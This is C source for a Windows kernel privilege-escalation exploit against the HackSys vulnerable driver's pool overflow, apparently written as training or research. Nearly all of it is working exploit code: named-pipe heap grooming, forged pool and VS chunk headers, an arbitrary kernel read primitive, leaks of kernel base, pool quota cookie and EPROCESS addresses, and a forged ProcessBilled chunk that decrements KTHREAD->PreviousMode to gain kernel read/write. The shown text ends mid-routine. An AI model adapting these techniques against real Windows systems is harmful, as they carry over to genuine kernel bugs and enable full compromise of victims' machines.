    // 2. The Reclamation Loop
    // We loop until the Ghost Pipe sees our changes, confirming overlap
    

    do
    {
        // Free the current occupant of the Hack slot
        // This uses hPipeHandlesReclaimHack[vuln_object_index]
        FreePipe(SPRAY_RECLAIM_HACK, vuln_object_index, 1);

        // Reclaim with our malicious payload (Forged Unbuffered Entry)
        res = CreatePipeQueueEntry(maliciousPayload, SPRAY_SIZE_RECLAIM_HACK,
            MEM_PERSISTENT, SPRAY_RECLAIM_HACK, vuln_object_index);

        // Check success by reading from the Ghost Pipe. 
        // If overlap is successful, the data read will NOT be the marker, 
        // because we've changed the DataEntryType to Unbuffered.
        res = PeekNamedPipe(hPipeHandlesGhost[GhostPipeIndex].Read,
            (char*)&ghost_np_data_queue_entry, 0x8, &resultLength, 0, 0);

        if (res && ghost_np_data_queue_entry != GHOST_CHUNK_MARKER)
        {
            printf("[+] Arbitrary Read Setup Successful!\n");
            printf("[+] Ghost Marker overwritten. Current value: 0x%" PRIxPTR "\n", ghost_np_data_queue_entry);
            successful = 1;
        }

    } while (!successful);


}
/**
 * Detects which sprayed pipe successfully overlaps with the ghost chunk.
 * * This function iterates through all "Hack Reclaim" pipes and uses PeekNamedPipe
 * to non-destructively inspect the buffered data. It searches for a break in
 * the '0x4949494949494949' (placeholder) pattern.
 *
 * If the memory overlap was successful, the read operation will return the
 * headers of the ghost chunk (VS Header, Pool Header, and NpFr Header) instead
 * of the original payload. This effectively "leaks" critical kernel pointers,
 * including the CCB (NpFc) pointer, which are necessary for the next stages
 * of the exploit.
 *
 * @return The index of the overlapping pipe in the handle array, or -1 if no overlap is detected.
 */

int detectOverlappedPipe()
{
    int res = 0;
    UCHAR payload[SPRAY_SIZE_RECLAIM_HACK - NP_HEADER_SIZE]; //0x60 blocks
    memset(payload, 0x44, sizeof(payload));
    DWORD resultLength = 0;
    int vuln_object_index = 0;

    for (int i = 0; i < NUM_PIPES_HACK_RECLAIM; i++)
    {

        res = PeekNamedPipe(hPipeHandlesReclaimHack[i].Read, payload, SPRAY_SIZE_RECLAIM_HACK - NP_HEADER_SIZE, &resultLength, 0, 0);
        NpFcPointer = *(DWORD64*)(payload + sizeof(HEAP_VS_CHUNK_HEADER) + sizeof(POOL_HEADER));
        if (NpFcPointer != 0x4949494949494949)
        {
            printf("[+] Corrupted DATA_QUEUE_ENTRY found!\n");
            printf("CCB object - NpFc_pointer: 0x%016I64x\n", NpFcPointer);
            vuln_object_index = i;

            memcpy(&leakedVsChunkHeader, payload, sizeof(HEAP_VS_CHUNK_HEADER));
            memcpy(&leakedGhostNpfrPoolHeader, payload + sizeof(HEAP_VS_CHUNK_HEADER), sizeof(POOL_HEADER)); //copy the NpFr Ghost header to used in the reclaim later as we don't want to overwrite this header
            memcpy(&leakedNpGhostNpfrHeader, payload + sizeof(HEAP_VS_CHUNK_HEADER) + sizeof(POOL_HEADER), sizeof(NP_DATA_QUEUE_ENTRY));


            return vuln_object_index;

        }

    }

    return -1; //overlapped pipe not found
}


/**
 * Locates the EPROCESS structure of the current process by walking the global process list.
 *
 * This function performs a linear search through the 'ActiveProcessLinks' doubly-linked list,
 * starting from a known EPROCESS (typically the System process). It utilizes an arbitrary
 * read primitive to traverse the Flink (forward link) pointers.
 *
 * For each node in the list, the function:
 * 1. Resolves the base address of the EPROCESS structure from the list entry offset.
 * 2. Reads the UniqueProcessId to compare it against the current process's PID.
 * 3. Continues until a match is found or the list wraps back to the starting point.
 *
 * @param ghost_pipe      Pointer to the pipe handles providing the arbitrary read primitive.
 * @param system_eprocess The kernel virtual address of the System EPROCESS (starting node).
 * @return The kernel virtual address of the current process's EPROCESS structure, or NULL if not found.
 */

uintptr_t findSelfEprocess(PIPE_HANDLES* ghost_pipe, uintptr_t system_eprocess)
{
    DWORD self_pid = GetCurrentProcessId();
    printf("[*] Searching for current process (PID: %d) in the process list...\n", self_pid);

    uintptr_t current_eprocess = system_eprocess;
    do
    {
        ArbitraryRead(ghost_pipe, current_eprocess + ActiveProcessLink_offset, (char*)&current_eprocess, 0x8);
        current_eprocess -= ActiveProcessLink_offset;

        uintptr_t current_pid = 0;
        ArbitraryRead(
            ghost_pipe,
            current_eprocess + ProcessID_offset,
            (char*)&current_pid, 0x8);

        if (current_pid == self_pid)
        {
            return current_eprocess;
        }

    } while (current_eprocess != system_eprocess);

    fprintf(stderr, "[-] Failed to locate EPROCESS structure for current process (PID: %d)\n", self_pid);
    return NULL;
}

/**
 * Locates the base address of the VS Subsegment by traversing the heap's chunk chain.
 *
 * This function utilizes the  arbitrary read primitive to scan forward from the current
 * ghost chunk. It decodes subsequent VS chunk headers using the Segment Heap's
 * XOR-encoding scheme (Header ^ Address ^ RtlpHpHeapGlobals).
 *
 * Once a valid allocated chunk is found, it uses the 'EncodedSegmentPageOffset'
 * fieldwhich contains the distance (in pages) from the Subsegment base to the
 * current pageto calculate the Subsegment's starting address.
 *
 * @param ghost_pipe Pointer to the pipe handles providing the arbitrary read primitive.
 * @return The kernel virtual address of the VS Subsegment base.
 */

uintptr_t locateVsSubSegment(PIPE_HANDLES *ghost_pipe)
{
    size_t vs_header_addr = GhostChunkPointer + TARGET_NPFS_CHUNK_SIZE*2 - sizeof(_HEAP_VS_CHUNK_HEADER) - sizeof(POOL_HEADER) - sizeof(NP_DATA_QUEUE_ENTRY); // +NEXT_CHUNK_OFFSET;

    while (true)
    {
        uint64_t encoded_vs_header[2];

        ArbitraryRead(ghost_pipe, vs_header_addr, (char*)&encoded_vs_header, sizeof(uint64_t));
        ArbitraryRead(ghost_pipe, vs_header_addr + 8, (char*)(&encoded_vs_header) + 8, sizeof(uint64_t));

        encoded_vs_header[0] = encoded_vs_header[0] ^ vs_header_addr ^ nt_RtlpHpHeapGlobals;
        encoded_vs_header[1] = encoded_vs_header[1] ^ vs_header_addr ^ nt_RtlpHpHeapGlobals;

        HEAP_VS_CHUNK_HEADER* vs_header = (HEAP_VS_CHUNK_HEADER*)&encoded_vs_header;
        /*printf("[*] vs_header_addr: 0x%llX\n\theader->Allocated: 0x%x\n\theader->UnsafePrevSize: 0x%x\n\theader->UnsafeSize: 0x%x\n\theader->EncodedSegmentPageOffset: 0x%x\n",
            vs_header_addr, vs_header->Allocated, vs_header->UnsafePrevSize, vs_header->UnsafeSize, vs_header->EncodedSegmentPageOffset);*/

        if (vs_header->Allocated)
        {
            uintptr_t vs_sub_segment = vs_header_addr - ((uintptr_t)vs_header->EncodedSegmentPageOffset << 12) & ~0xfffll;
            return vs_sub_segment;
        }

        vs_header_addr += vs_header->UnsafeSize * 0x10;
    }
}

/**
 * Constructs a forged Variable Size (VS) heap chunk to facilitate the ProcessBilled attack.
 * * This function prepares a fake heap structure that overlaps with the ghost chunk.
 * It manually calculates the VS header metadata, handles the mandatory Segment Heap
 * XOR-encoding, and sets the PoolQuota flag to trigger a decrement on free.
 *
 * @param vs_sub_segment The base address of the VS Subsegment containing the target chunk.
 */
void constructFakeVsChunk( uintptr_t vs_sub_segment)
{
    HEAP_VS_CHUNK_HEADER new_vs_header = { 0 };
    new_vs_header.Allocated = 0x1;
    new_vs_header.UnsafePrevSize = PREV_CHUNK_OFFSET / 0x10;  //size between ghost chunk VS header start and hack chunk VS header start
    new_vs_header.UnsafeSize = (NEXT_CHUNK_OFFSET) / 0x10;  //size of the ghost chunk
    new_vs_header.EncodedSegmentPageOffset = (GhostChunkPointer - vs_sub_segment) >> 12 & 0xff;

    uint64_t* new_encoded_vs_header = (uint64_t*)&new_vs_header;
    new_encoded_vs_header[0] = new_encoded_vs_header[0] ^ GhostChunkPointer ^ nt_RtlpHpHeapGlobals;
    new_encoded_vs_header[1] = new_encoded_vs_header[1] ^ GhostChunkPointer ^ nt_RtlpHpHeapGlobals;

    g_fake_process_billed_chunk->encoded_vs_header[0] = new_encoded_vs_header[0];
    g_fake_process_billed_chunk->encoded_vs_header[1] = new_encoded_vs_header[1];

    //maintain previous ghost chunk pool header except the PoolType to execute the ProcessBill attack
    //memcpy(&g_fake_process_billed_chunk->pool_header, &leakedGhostNpfrPoolHeader, sizeof(POOL_HEADER));
    g_fake_process_billed_chunk->pool_header.PreviousSize = 0;
    g_fake_process_billed_chunk->pool_header.PoolIndex = 0;
    g_fake_process_billed_chunk->pool_header.BlockSize = 0x100 / 0x10;  //need to be below 0x100 to be handled by the LFH backend, otherwise the ProcessQuota decrement doesn't work
    g_fake_process_billed_chunk->pool_header.PoolTag = 0x42424242;
    g_fake_process_billed_chunk->pool_header.PoolType = 0x8; //PoolQuota flag enabled (charge quota when chunk is freed)

    //init NpFr header
    g_fake_process_billed_chunk->np_data_queue_entry.QueueEntry.Flink = (LIST_ENTRY*)NpFcPointer;
    g_fake_process_billed_chunk->np_data_queue_entry.QueueEntry.Blink = (LIST_ENTRY*)NpFcPointer;
    g_fake_process_billed_chunk->np_data_queue_entry.Irp = 0;
    g_fake_process_billed_chunk->np_data_queue_entry.ClientSecurityContext = 0;
    g_fake_process_billed_chunk->np_data_queue_entry.DataEntryType = 0;

    //we are not using IRP anymore so initialize these fields in the NpFr header

    g_fake_process_billed_chunk->np_data_queue_entry.DataSize = SPRAY_SIZE_GHOST_CHUNK - sizeof(HEAP_VS_CHUNK_HEADER) - sizeof(NP_DATA_QUEUE_ENTRY) - sizeof(POOL_HEADER); //CALC_NDQE_DataSize
    g_fake_process_billed_chunk->np_data_queue_entry.QuotaInEntry = SPRAY_SIZE_GHOST_CHUNK - sizeof(HEAP_VS_CHUNK_HEADER) - sizeof(NP_DATA_QUEUE_ENTRY) - sizeof(POOL_HEADER);
    g_fake_process_billed_chunk->np_data_queue_entry.unknown = 0;
    *((uint64_t*)g_fake_process_billed_chunk->np_data_queue_entry.data) = PROCESSBILL_CHUNK_MARKER; //include a new marker to locate the chunk when replacing the arb read ghost chunk by this one

}

/*
 * This function initializes the specific EPROCESS fields required to trigger the
 * ProcessBilled attack primitive.
 *
 * Specifically, it sets:
 * 1. Pcb.Header.Type: To ensure the fake EPROCESS structure passes kernel type-validation.
 * 2. QuotaBlock: This pointer is initialized with the target memory address we
 * intend to decrement (e.g., KTHREAD->PreviousMode).
 */

int setupFakeEprocess(char* fake_eprocess_buf, uintptr_t addr_to_decrement)
{
    memset((PVOID)fake_eprocess_buf, 0x41, EPROCESS_SIZE);

    PVOID addr = (PVOID)((DWORD64)fake_eprocess_buf + EPROCESS_OFFSET);

    // Pcb.Header.Type

    /*
    Object Type,Type Value (Hex)
    Process (EPROCESS),0x03
    Thread (ETHREAD),0x06
    Event,0x00 (Notification) or 0x01 (Synchronization)
    Mutant (Mutex),0x02
    Timer,0x08*/

    memset((char*)addr, 0x3, 1); //EPROCESS type


    // QuotaBlock: Set address to decrement in fake structure
    memcpy((char*)addr + EPROCESS_QUOTABLOCK_OFFSET, &addr_to_decrement, sizeof(DWORD64));

    /*we do not need to initialize more EPROCESS fields as they are not used when the chunk is freed and the quotablock decremented*/



    return 1;
}

/*This function just allocates the fake EPROCESS created by constructFakeVsChunk() using a NPFR object*/

uintptr_t allocFakeEprocess(PIPE_HANDLES *vuln_pipe, PIPE_HANDLES * ghost_pipe, char* fake_eprocess_buf)
{
    // Write fake EPROCESS data to the previous chunk pipe, creating a linked NP_DATA_QUEUE_ENTRY

    DWORD bytesWritten;
    DWORD dwError;


    if (!WriteFile(vuln_pipe->Write, fake_eprocess_buf, EPROCESS_SIZE, &bytesWritten, NULL)) {
        dwError = GetLastError();
        // WriteFile will likely fail if a pipe client is not connected, but the 
        // kernel structure (IRP and PipeQueueEntry) is often still allocated.
        // For a robust spray, proper client/server setup or ConnectNamedPipe is needed.
        printf("Error when writing to pipe %u\n", dwError);

        numError++;

        if (dwError != ERROR_IO_PENDING) {
            // If it's not pending, and not a known success, handle the error.
            // printf("[-] WARNING: WriteFile failed for index %lu. LastError: %lu\n", i, GetLastError());
        }

        return 0;
    }



    // Calculate address of the previous chunk's NP_DATA_QUEUE_ENTRY
    uintptr_t vuln_vs_chunk = GhostChunkPointer - sizeof(HEAP_VS_CHUNK_HEADER) - sizeof(POOL_HEADER) - sizeof(NP_DATA_QUEUE_ENTRY);
    uintptr_t vuln_np_data_queue_entry = vuln_vs_chunk + sizeof(HEAP_VS_CHUNK_HEADER) + sizeof(POOL_HEADER);

    /* Get address of the new NP_DATA_QUEUE_ENTRY via Flink - When using WriteFile using the same handle, 
    a new NpFr object is allocated.This object is linked with the previous one and its address is stored in the previous object NpFr header(flink pointer) */ 

    uintptr_t new_np_data_queue_entry;
    ArbitraryRead(ghost_pipe, vuln_np_data_queue_entry + offsetof(LIST_ENTRY, Flink), (char*)&new_np_data_queue_entry, 0x8);

    // Return the address of the fake EPROCESS within the new NP_DATA_QUEUE_ENTRY's data buffer
    return new_np_data_queue_entry + offsetof(NP_DATA_QUEUE_ENTRY, data) + EPROCESS_OFFSET;
}

/*

This function frees the Hack slot and reclaims it using an NpFr object. 
The body of this object is designed to create a fake NpFr header inside the ghost chunk.
Because the Hack and ghost chunks overlap, 
writing data through the Hack pipe allows us to overwrite the NpFr header of the ghost chunk.

*/
void setFakeProcessBilled(PIPE_HANDLES* vuln_pipe, PIPE_HANDLES* ghost_pipe, uintptr_t fake_eprocess, int vuln_object_index)
{
    int res = 0;
    g_fake_process_billed_chunk->pool_header.ProcessBilled = fake_eprocess ^ nt_expPoolQuotaCookie ^ (GhostChunkPointer + sizeof(HEAP_VS_CHUNK_HEADER));

   // g_fake_process_billed_chunk->pool_header.ProcessBilled = (fake_eprocess) ^ nt_expPoolQuotaCookie ^ GhostChunkPointer;

    printf("g_fake_process_billed_chunk: %p\n", g_fake_process_billed_chunk);
    DWORD resultLength = 0;
    uintptr_t ghost_np_data_queue_entry = NULL;


    /*Maybe is better to improve this spraying chunks to reclaim the freed object rather than using the do-while*/
    do
    {
        printf("Free vuln_pipe in setFakeProcessBilled\n");
        /* FreeNpDataQueueEntry(pipes->previous_chunk_pipe, VULN_NPFS_CHUNK_SIZE); //vuln_pipe
         pipes->previous_chunk_pipe = AllocNpDataQueueEntry(VULN_NPFS_CHUNK_SIZE, (char*)g_fake_process_billed_chunk, sizeof(vs_chunk_t) + 0x8);*/

        FreePipe(SPRAY_RECLAIM_HACK, vuln_object_index, 0); //in the next iteration, will freed the previously allocated pipe (done by the do-while loop itself) to avoid grooming the heap
        
        //reclaim freed vuln object containing the fake NpFr with a IRP->systemBuffer pointing to an arbitrary address

        Sleep(500);

        CreatePipeQueueEntry((char*)g_fake_process_billed_chunk, SPRAY_SIZE_RECLAIM_HACK, MEM_PERSISTENT, SPRAY_RECLAIM_HACK, vuln_object_index);
        

        vuln_pipe->Read = hPipeHandlesReclaimHack[vuln_object_index].Read; //copy pipe handles
        vuln_pipe->Write = hPipeHandlesReclaimHack[vuln_object_index].Write;

        res = PeekNamedPipe(ghost_pipe->Read, (char*)&ghost_np_data_queue_entry, 0x8, &resultLength, 0, 0);

        //rbitraryRead(ghost_pipe, NpFcPointer, (char*)&ghost_np_data_queue_entry, 0x8);


    } while (ghost_np_data_queue_entry != PROCESSBILL_CHUNK_MARKER);
    printf("\n");
}

/*
 * This function frees the ghost chunk to trigger the ProcessBilled exploitation primitive.
 * * POOL_HEADER.ProcessBilled is an XOR-encoded pointer that normally points to the
 * QuotaBlock (+0x568) of an EPROCESS structure.
 * * We have used constructFakeVsChunk() to craft a fake EPROCESS structure in kernel
 * memory so that the decoded ProcessBilled pointer resolves to it. The QuotaBlock
 * within our fake EPROCESS is set to point to the current KTHREAD->PreviousMode.
 * * When the chunk is freed, the kernel attempts to decrement the QuotaBlock's
 * reference count. This decrements PreviousMode from 1 (UserMode) to 0 (KernelMode),
 * granting the process arbitrary kernel write capabilities.
 */

void triggerArbitraryDecrement(PIPE_HANDLES* ghost_pipe, int GhostPipeIndex)
{
    printf("[*] Trigger arbitrary decremnt\n");
    FreePipe(SPRAY_RECLAIM_GHOST, GhostPipeIndex, 0);

}

void closeHandles(int index, DWORD SprayType)
{
    SPRAY_CONFIG* cfg = &SprayTable[SprayType];
    PIPE_HANDLES* ph = &cfg->HandleArray[index];

    CloseHandle(ph->Read);
    CloseHandle(ph->Write);

}

BOOL EnableLookaside(char* payload, DWORD SprayType, DWORD numPipes) {
    // Stage 1: Initial fill
    PipeQueueEntrySpray(payload, SprayType, MEM_PERSISTENT, numPipes, 0);
    Sleep(2000);

    // Stage 2: Secondary fill to trigger popularity/promotion
    PipeQueueEntrySpray(payload, SprayType, MEM_PERSISTENT, numPipes, numPipes);
    Sleep(1000);

    // Stage 3: Final small batch to ensure top-of-list placement
    PipeQueueEntrySpray(payload, SprayType, MEM_PERSISTENT, 256, numPipes * 2);

    printf("[+] Lookaside enabled for SprayType %d\n", SprayType);
    return TRUE;
}


uintptr_t Read64(uintptr_t address)
{
    // Read 8 bytes from kernel memory (possible due to PreviousMode being 0)
    uintptr_t read_qword = 0;
    ULONG  read_bytes;

    if (!pNtReadVirtualMemory(GetCurrentProcess(), (LPVOID)(address), (LPVOID)&read_qword, sizeof(uintptr_t), &read_bytes))
    {

        return read_qword;
    }
    else
    {
        printf("ERROR in ReadProcessMemory: %u\n", GetLastError());
        return read_qword;
    }
}

NTSTATUS Write64(uintptr_t address, uintptr_t value)
{
    // Write 8 bytes to kernel memory (possible due to PreviousMode being 0)
    return pNtWriteVirtualMemory(GetCurrentProcess(), (LPVOID)address, &value, sizeof(uintptr_t), NULL);
}


// Function to trigger the vulnerability
BOOL TriggerHEVDVulnerability() {
    HANDLE hDevice;
    BOOL bResult = FALSE;
    DWORD bytesReturned = 0;

    printf("SPRAY_SIZE_GHOST_CHUNK: %x\n", SPRAY_SIZE_GHOST_CHUNK);
    printf("PREVIOUS_SIZE: %x\n", PREVIOUS_SIZE);
    printf("SPRAY_SIZE_GROOM: %x\n", SPRAY_SIZE_GROOM);

    system("Pause");

    GetNtFunction();


    PIPE_HANDLES handlesInit = { INVALID_HANDLE_VALUE ,INVALID_HANDLE_VALUE };
    //Init Handle Arrays
    for (int i = 0; i < MAX_SIZE; i++)
    {
        hPipeHandlesEprocess[i] = handlesInit;
        hPipeHandlesGroomNpfr[i] = handlesInit;
        hPipeHandlesReclaimHack[i] = handlesInit;
        hPipeHandlesHack[i] = handlesInit;
        hPipeHandlesGhost[i] = handlesInit;
        hPipeHandlesLookasideNpfr[i] = handlesInit;
        hPipeHandlesLookAsideGhost[i] = handlesInit;
        hPipeHandlesLookAsideHack[i] = handlesInit;
        
    }

    

    // 1. Open a handle to the HEVD driver device
   // printf("[*] Opening handle to device: %s\n", HEVD_DEVICE_NAME);
    printf("[*] Opening handle to device\n");
    hDevice = CreateFileA(
        HEVD_DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] ERROR: Failed to open device handle. GetLastError: %lu\n", GetLastError());
        return FALSE;
    }

    

    printf("[+] Handle opened successfully. Handle value: 0x%p\n", hDevice);

    // 2. Create big holes
    
    //char maliciousPayload[SPRAY_SIZE_GROOM];
    char* maliciousPayload = (char*)VirtualAlloc(
        NULL,
        MAX_SIZE,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    memset(maliciousPayload, 0x49, SPRAY_SIZE_GROOM); // Fill with 'A's (0x42) as a placeholder
    POOL_HEADER fakePoolHeader;
    memset(&fakePoolHeader, 0, sizeof(fakePoolHeader));

    
    vs_chunk_header vs_chunk_header_obj = { 0 };
    vs_chunk_header_obj.qword1 = 0x0;
    vs_chunk_header_obj.qword2 = 0xb9;


    fakePoolHeader.BlockSize = BLOCK_SIZE_OVERWRITE;  //0x3F
    fakePoolHeader.PoolType = 0x2;
    fakePoolHeader.PreviousSize = 0;
    fakePoolHeader.PoolIndex = 0;
    fakePoolHeader.PoolTag = 0x4141414141;

    memcpy(maliciousPayload, &vs_chunk_header_obj, sizeof(vs_chunk_header));
    memcpy(maliciousPayload + sizeof(_HEAP_VS_CHUNK_HEADER), &fakePoolHeader, sizeof(fakePoolHeader));

    // 3. Prepare the Malicious Input Buffer
    char exploitBuffer[BUFFER_SIZE_OVERFLOW];
    memset(exploitBuffer, 0x45, BUFFER_SIZE_OVERFLOW);

    // Fill the buffer with a known pattern (e.g., 'A' or 0x41)
    memset(exploitBuffer + ALLOC_SIZE + PADDING + sizeof(HEAP_VS_CHUNK_HEADER), PREVIOUS_SIZE, 1);  //previousSize
    memset(exploitBuffer + ALLOC_SIZE + PADDING + sizeof(HEAP_VS_CHUNK_HEADER) + 1, 0x0, 1); //PoolIndex - Not Used
    memset(exploitBuffer + ALLOC_SIZE + PADDING + sizeof(HEAP_VS_CHUNK_HEADER) + 2, 0x0, 1); //BLockSize - Not USed
    memset(exploitBuffer + ALLOC_SIZE + PADDING + sizeof(HEAP_VS_CHUNK_HEADER) + 3, 0x04, 1); //PoolType - CacheAligned flag enabled



    //1. Enable the VS_SUB_SEGMENT
    

    printf("[***] 1. Spray the heap with HACK chunks to enable the subsegment\n\n");
    char payload[HACK_CHUNK_SIZE];
    memset(payload, 0x90, HACK_CHUNK_SIZE);

    if (PipeQueueEntrySpray(payload, SPRAY_HACK, NUM_ENABLE_SUBSEGMENT, NUM_ENABLE_SUBSEGMENT, 0))
    {
        printf("\n[***] The heap has been sprayed to groom the heap\n");
            // In a real exploit, the next step would be the DeviceIoControl call 
            // to trigger the UAF or Pool Overflow.
    }
    else 
    {
        printf("\n[---] Heap spray failed, type: %u\n", SPRAY_HACK);
    }



    // 2. Spray the heap with PIPES to groom the heap

    printf("[***] 2. Spray the heap with PIPES to groom the heap\n\n");
    
    DWORD baseIndex = 0;
    for (int i = 0; i < GROOM_ITERATIONS; i++)
    {
        baseIndex = i * NUM_PIPES_GROOM;
        if (PipeQueueEntrySpray(maliciousPayload, SPRAY_GROOM_HEAP, MEM_PERSISTENT, NUM_PIPES_GROOM, baseIndex)) {
            printf("\n[***] The heap has been sprayed to groom the heap\n");
            // In a real exploit, the next step would be the DeviceIoControl call 
            // to trigger the UAF or Pool Overflow.
        }
        else {
            printf("\n[---] Heap spray failed, type: %u\n", SPRAY_GROOM_HEAP);
        }

        
    }

    Sleep(1000);


    printf("[***] 3. Enable LookAside for Hack chunk size\n\n");
    //Lookaside
    EnableLookaside(maliciousPayload, SPRAY_LOOKASIDE_HACK_HEAP, NUM_PIPES_ENABLE_LOOOKASIDE_HACK);

    printf("[***] 4. Create Holes\n\n");

    // 5. Create holes to place the Hack object in one of them, just before a NpFr object
    CreatePoolHoles(3,SPRAY_GROOM_HEAP);

    // 6. Send the IOCTL request to trigger the Stack Buffer Overflow

    printf("[***] 5. TRIGGERING POOL OVERFLOW (size: %d bytes) via IOCTL 0x%lx...\n\n",
        BUFFER_SIZE_OVERFLOW, HACKSYS_EVD_IOCTL_HEAP_OVERFLOW);

    bResult = DeviceIoControl(
        hDevice,
        HACKSYS_EVD_IOCTL_HEAP_OVERFLOW,
        exploitBuffer, // Input buffer (the malicious data)
        sizeof(exploitBuffer), // Input buffer length (the large size)
        NULL, // Output buffer (not needed for this vulnerability)
        0,    // Output buffer length
        &bytesReturned,
        NULL
    );

    Sleep(2000);  //THIS MAKES THE RECLAIM MUCH MORE RELIRABLE - Avoid Deferred Free Queue

    //7. Reclaim Hack freed object
    printf("[***] 6. Reclaim Hack freed object\n\n");

    if (PipeQueueEntrySpray(maliciousPayload, SPRAY_RECLAIM_HACK, MEM_PERSISTENT, NUM_PIPES_HACK_RECLAIM,0)) {
        printf("\n[***] The heap has been sprayed with NpFr objects to reclaim the freed Hack object.\n");
        // In a real exploit, the next step would be the DeviceIoControl call 
        // to trigger the UAF or Pool Overflow.
    }
    else {
        printf("\n[---] Heap spray failed, type: %u\n", SPRAY_RECLAIM_HACK);
    }




    printf("[***] 7. Enable LookAside for target NpFr chunk size\n\n");

    //8. Enable LookAside for victim NpFr chunk size just before freeing the overwritten chunk
    
    EnableLookaside(maliciousPayload, SPRAY_LOOKASIDE_NPFR_HEAP, NUM_PIPES_ENABLE_LOOOKASIDE_GROOM);


    //8.b. Enable LookAside for ghost chunk size just before freeing the overwritten chunk

    printf("[***] 8. Enable LookAside for  Ghost chunk size\n\n");
    
    EnableLookaside(maliciousPayload, SPRAY_LOOKASIDE_GHOST_HEAP, NUM_PIPES_ENABLE_LOOOKASIDE_GHOST);
   

    //10. free overwritten object and reclaim it with the ghost chunk
    printf("[***] 9. free overwritten object and reclaim it with the ghost chunk\n\n");


    memset(maliciousPayload, 0x47, SPRAY_SIZE_GHOST_CHUNK);

    memset(&leakedGhostNpfrPoolHeader, 0, sizeof(POOL_HEADER));
    memset(&leakedVsChunkHeader, 0, sizeof(HEAP_VS_CHUNK_HEADER));
    memset(&leakedNpGhostNpfrHeader, 0, sizeof(NP_DATA_QUEUE_ENTRY));

    
    printf("[***] 10. Detect overlapped pipe\n\n");

    PIPE_HANDLES hack_pipe = { 0 };
    vuln_object_index = FreeAndReclaimGhostChunk(maliciousPayload, &GhostPipeIndex);

    hack_pipe.Read = hPipeHandlesReclaimHack[vuln_object_index].Read; //copy pipe handles
    hack_pipe.Write = hPipeHandlesReclaimHack[vuln_object_index].Write;

    //Achieve arbitrary read. For this, freed the vuln chunk and reclaim it with a new pipe. ffff800f22e66440+0x60 will point to the NP_HEADER_SIZE of the ghost chunk
    //we want to overwrite this header to achieve arbitrary read.


    // Enabled lookAside for target chunk

    printf("[***] 11. Enabled lookAside for target chunk\n\n");

    //REVISAR ESTA PARTE- CRASHEA

    //Lookaside

    EnableLookaside(maliciousPayload, SPRAY_LOOKASIDE_HACK_HEAP, NUM_PIPES_ENABLE_LOOOKASIDE_HACK);


    PVOID address = (PVOID)NpFcPointer;
    printf("[***] 12. Arbitrary read setup\n\n");
   
    char output[1000];
    
    userlandIrp.AssociatedIrp.SystemBuffer = address;  //read from this address
    ArbitraryRead_Setup( &userlandIrp, maliciousPayload, vuln_object_index, GhostPipeIndex);


    /*15. Start leaking addresses*/

    printf("[***] 13. Arbitrary read setup: %p\n\n", address);

    ghost_pipe = hPipeHandlesGhost[GhostPipeIndex];
    ArbitraryRead(&ghost_pipe, NpFcPointer, (char*)&GhostChunkPointer, 0x8); //hPipeHandlesGhost[GhostPipeIndex]
    GhostChunkPointer = GhostChunkPointer - sizeof(POOL_HEADER) - sizeof(HEAP_VS_CHUNK_HEADER);
    printf("[+] GhostChunkPointer: 0x%" PRIxPTR "\n", GhostChunkPointer);

    printf("[***] 14. Leaking kernel pointers...\n\n");

    //first we leak the file object that is inside the NpFc object (PIPE CCB)
    ArbitraryRead(&ghost_pipe, NpFcPointer - NPFC_CCB_OFFSET + NPFC_CCB_FILE_OFFSET, (char*)&leakedFileObj, 0x8);
    printf("[+] leakedFileObj: 0x%" PRIxPTR "\n", leakedFileObj);

    //from this file object, leak the device object
    ArbitraryRead(&ghost_pipe, leakedFileObj + DEV_OFFSET, (char*)&DevObj, 0x8);
    printf("[+] DevObj: 0x%" PRIxPTR "\n", DevObj);

    //from this device object, leak the DRV object
    ArbitraryRead(&ghost_pipe, DevObj + DRV_OFFSET, (char*)&DrvObj, 0x8);
    printf("[+] DrvObj: 0x%" PRIxPTR "\n", DrvObj);

    //DRV object contains the base address of the NBFS kernel module (npfs.sys driver)
    ArbitraryRead(&ghost_pipe, DrvObj + NPFS_BASE_OFFSET, (char*)&Npfs_base, 0x8);
    printf("[+] Npfs_base: 0x%" PRIxPTR "\n", Npfs_base);

    //extract from the npfs.sys import table the address of the exAllocatePool2 function exported by the NT kernel (ntoskrnl.exe)
    ArbitraryRead(&ghost_pipe, Npfs_base + NPFS_ExAllocatePool2_offset, (char*)&nt_exAllocatePool2_addr, 0x8);
    printf("[+] nt_exAllocatePool2_addr: 0x%" PRIxPTR "\n", nt_exAllocatePool2_addr);

    //calculate the ntkernel base address
    nt_base = nt_exAllocatePool2_addr - NT_ExAllocatePool2_offset;
    printf("[+] nt_base: 0x%" PRIxPTR "\n", nt_base);

    ArbitraryRead(&ghost_pipe, nt_base + NT_ExPoolQuotaCookie, (char*)&nt_expPoolQuotaCookie, 0x8);
    printf("[+] nt_expPoolQuotaCookie: 0x%" PRIxPTR "\n", nt_expPoolQuotaCookie);

    ArbitraryRead(&ghost_pipe, nt_base + NT_RtlpHpHeapGlobals, (char*)&nt_RtlpHpHeapGlobals, 0x8);
    printf("[+] nt_RtlpHpHeapGlobals: 0x%" PRIxPTR "\n", nt_RtlpHpHeapGlobals);

    ArbitraryRead(&ghost_pipe, nt_base + NT_PsInitialSystemProcess_offset, (char*)&system_eprocess, 0x8);
    printf("[+] system_eprocess: 0x%" PRIxPTR "\n", system_eprocess);

    self_eprocess = findSelfEprocess(&ghost_pipe,system_eprocess);
    printf("[+] self_eprocess: 0x%" PRIxPTR "\n", self_eprocess);

    ArbitraryRead(&ghost_pipe, self_eprocess + thread_list_offset, (char*)&self_kthread, 0x8);
    self_kthread = self_kthread - PREV_KTRHEAD;
    printf("[+] self_kthread: 0x%" PRIxPTR "\n", self_kthread);

    ArbitraryRead(&ghost_pipe, self_kthread + kthread_previous_mode_offset, (char*)&self_kthread_prevMode, 0x1);
    printf("[+] self_kthread_prevMode: 0x%" PRIxPTR "\n", self_kthread_prevMode);


    vs_sub_segment = locateVsSubSegment(&ghost_pipe);
    printf("[+] vs_sub_segment: 0x%" PRIxPTR "\n\n", vs_sub_segment);

    printf("[***] 15. Construct fake VS chunk to achieve arbitrary decrement\n");

    constructFakeVsChunk(vs_sub_segment); //g_fake_process_billed_chunk initialized

    addr_to_decrement = self_kthread + kthread_previous_mode_offset - 0x1;


    printf("[*] Preparing fake EPROCESS buffer\n");
